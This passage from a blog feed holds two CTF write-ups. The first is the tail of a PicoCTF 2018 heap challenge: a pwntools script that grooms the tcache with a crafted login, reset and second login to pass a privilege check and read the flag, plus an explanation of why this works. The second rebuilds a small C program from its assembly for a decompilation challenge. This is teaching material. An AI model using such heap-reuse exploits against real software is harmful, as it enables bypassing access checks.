style="color:#393A34">=</span><span class="token plain"> ELF</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"./ld-2.27.so"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">binary </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">log_level </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'info'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">context</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">terminal </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">'gnome-terminal'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'-e'</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">conn</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:#e3116c">'''Establish the connection to the process, local or remote.</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    '''</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    io </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> process</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">exe</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">path</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> io</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:#e3116c">'''Return the flag.</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    '''</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> get_flag</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">get_flag</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:#e3116c">'''Get the flag'''</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> conn</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> io</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"login aaaaaaaa"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b'\x05'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b"&gt; "</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b"&gt; "</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b"reset"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b"&gt; "</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b"login bob"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sendlineafter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b"&gt; "</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b"get-flag"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">recvline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        io</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">success</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Flag found: "</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> flag</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> __name__ </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'__main__'</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>This attack is successful because of how the glibc heap management works. Data that is freed will be stored in tcache if it meets size requirements and has space to store chunks. Tcache is the first place that is checked for memory allocation or placing free'd chunks. Tcache is meant to speed up performance because it is thread specific and does not require the bin to be locked for modification. If the program called a function pointer instead of checking an integer value, I would be able to call the <code>give_flag()</code> function directly.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="references">References<a class="hash-link" href="#references" title="Direct link to heading">​</a></h2><p><a href="https://sourceware.org/glibc/wiki/MallocInternals" target="_blank" rel="noopener noreferrer">Sourceware glibc Wiki</a></p>]]></content>
        <author>
            <name>Christopher Nguyen</name>
            <uri>https://github.com/christopher-nguyen-re</uri>
        </author>
        <category label="PicoCTF 2018" term="PicoCTF 2018"/>
        <category label="Binary Exploitation" term="Binary Exploitation"/>
        <category label="Heap grooming" term="Heap grooming"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[baby-c]]></title>
        <id>baby-c</id>
        <link href="https://christopher-nguyen-re.github.io/blog/baby-c"/>
        <updated>2022-02-15T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Decompetition.io: baby-c]]></summary>
        <content type="html"><![CDATA[<p>Decompetition.io: baby-c</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="the-challenge">The Challenge<a class="hash-link" href="#the-challenge" title="Direct link to heading">​</a></h2><p>This challenge can be found <a href="https://decompetition.io/challenges" target="_blank" rel="noopener noreferrer">here</a>.</p><p>The provided executable <a href="/files/baby-c/baby-c">here</a></p><p>The goal of this challenge is to recreate the baby-c source file so that when it is decompiled, the assembly matches the provided target.</p><h2 class="anchor anchorWithStickyNavbar_mojV" id="analysis">Analysis<a class="hash-link" href="#analysis" title="Direct link to heading">​</a></h2><p>First, I looked at the provided assembly and attempted to figure out the program's general behavior. The challenge tells us that Intel syntax is used.</p><h3 class="anchor anchorWithStickyNavbar_mojV" id="full-assembly">Full assembly<a class="hash-link" href="#full-assembly" title="Direct link to heading">​</a></h3><div class="codeBlockContainer_I0IT language-assembly theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-assembly codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token plain">main:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  endbr64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  push    rbp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     rbp, rsp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  push    rbx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  sub     rsp, 0x18</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     [rbp-0x15], 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">block1:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     rax, [stdin]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     rdi, rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  call    getc@plt.sec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     [rbp-0x14], eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  cmp     [rbp-0x14], -1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  je      block7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">block2:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  call    __ctype_b_loc@plt.sec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     rax, [rax]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     edx, [rbp-0x14]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  movsxd  rdx, edx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  add     rdx, rdx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  add     rax, rdx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  movzx   eax, [rax]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  movzx   eax, ax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  and     eax, 0x2000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  test    eax, eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  je      block4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">block3:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     rdx, [stdout]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     eax, [rbp-0x14]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     rsi, rdx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     edi, eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  call    putc@plt.sec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     [rbp-0x15], 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  jmp     block1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">block4:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  cmp     [rbp-0x15], 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  je      block6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">block5:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     rbx, [stdout]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     eax, [rbp-0x14]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     edi, eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  call    toupper@plt.sec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     rsi, rbx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     edi, eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  call    putc@plt.sec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     [rbp-0x15], 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  jmp     block1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">block6:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     rbx, [stdout]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     eax, [rbp-0x14]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     edi, eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  call    tolower@plt.sec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     rsi, rbx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     edi, eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  call    putc@plt.sec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  jmp     block1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">block7:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     eax, 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  add     rsp, 0x18</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  pop     rbx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  pop     rbp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  ret</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><h3 class="anchor anchorWithStickyNavbar_mojV" id="examining-assembly-components">Examining assembly components<a class="hash-link" href="#examining-assembly-components" title="Direct link to heading">​</a></h3><div class="codeBlockContainer_I0IT language-assembly theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-assembly codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token plain">main:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  endbr64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  push    rbp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     rbp, rsp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  push    rbx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  sub     rsp, 0x18</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     [rbp-0x15], 1</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>From main, the stack was allocated and the value '1' is stored on the stack at <code>[rbp-0x15]</code>.</p><div class="codeBlockContainer_I0IT language-assembly theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-assembly codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token plain">block1:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     rax, [stdin]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     rdi, rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  call    getc@plt.sec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     [rbp-0x14], eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  cmp     [rbp-0x14], -1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  je      block7</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>In block 1, getc is called with stdin as its argument. The return value of getc is moved from eax into <code>[rbp-0x14]</code>, a location on the stack. It checks the return value for the value '-1' and jumps to block 7 if it is equal. If it is not equal, the assembly control flow continues into block 2.</p><div class="codeBlockContainer_I0IT language-assembly theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-assembly codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token plain">block2:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  call    __ctype_b_loc@plt.sec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     rax, [rax]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     edx, [rbp-0x14]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  movsxd  rdx, edx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  add     rdx, rdx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  add     rax, rdx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  movzx   eax, [rax]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  movzx   eax, ax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  and     eax, 0x2000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  test    eax, eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  je      block4</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p><code>__ctype_b_loc</code> is an accessor function used by the ctype library. It returns an <code>unsigned short int**</code> which points to array of characters in the current locale containing characteristics for each current character set. The character that had been received from <code>getc</code> is used and its characteristic was checked to match <code>0x2000</code>. <code>0x2000</code> was the value for the <code>_ISspace</code> constant contained in ctype.h. From this I determined that the <code>isspace()</code> function was likely used to check that the character was a space. If this was true, the assembly would jump to block4. Otherwise, it continued to block 3.</p><div class="codeBlockContainer_I0IT language-assembly theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-assembly codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token plain">block3:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     rdx, [stdout]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     eax, [rbp-0x14]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     rsi, rdx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     edi, eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  call    putc@plt.sec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     [rbp-0x15], 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  jmp     block1</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>This block simply called <code>putc</code> with the character we obtained from <code>getc</code> stored at <code>[rbp-0x14]</code>. It stored the value '1' into <!-- -->[rbp-0x15]<!-- --> and jumped back to block1. This implied that there was a loop in the main function.</p><div class="codeBlockContainer_I0IT language-assembly theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-assembly codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token plain">block4:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  cmp     [rbp-0x15], 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  je      block6</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>Block4 checked that the value stored at <code>[rbp-0x15]</code> was 0 and jumped to block 6 if true. Otherwise, it continued to block 5. <code>[rbp-0x15]</code> gave me the impression that it was being used as a flag for something.</p><div class="codeBlockContainer_I0IT language-assembly theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-assembly codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token plain">block5:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     rbx, [stdout]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     eax, [rbp-0x14]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     edi, eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  call    toupper@plt.sec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     rsi, rbx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     edi, eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  call    putc@plt.sec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     [rbp-0x15], 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  jmp     block1</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>Here, <code>toupper()</code> was called with <code>stdout</code> and <code>[rbp-0x14</code>] as arguments. By this point we already knew that <code>[rbp-0x14]</code> is the character we obtain from <code>getc</code> stored on the stack. <code>putc</code> is then called to print the character. If <code>toupper</code> was successful, then this character would be capitalized. Otherwise, the character would be unchanged and printed to <code>stdout</code>.</p><div class="codeBlockContainer_I0IT language-assembly theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-assembly codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token plain">block6:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     rbx, [stdout]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     eax, [rbp-0x14]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     edi, eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  call    tolower@plt.sec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     rsi, rbx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     edi, eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  call    putc@plt.sec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  jmp     block1</span><br></span></code></pre><button type="button" aria-label="Copy code to clipboard" title="Copy" class="copyButton_eDfN clean-btn"><span class="copyButtonIcons_W9eQ" aria-hidden="true"><svg class="copyButtonIcon_XEyF" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_i9w9" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div><p>This was the same as block5. The only difference was that it called <code>tolower()</code> instead of <code>toupper()</code>.</p><div class="codeBlockContainer_I0IT language-assembly theme-code-block"><div class="codeBlockContent_wNvx" style="color:#393A34;background-color:#f6f8fa"><pre tabindex="0" class="prism-code language-assembly codeBlock_jd64 thin-scrollbar"><code class="codeBlockLines_mRuA"><span class="token-line" style="color:#393A34"><span class="token plain">block7:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  mov     eax, 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  add     rsp, 0x18</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  pop     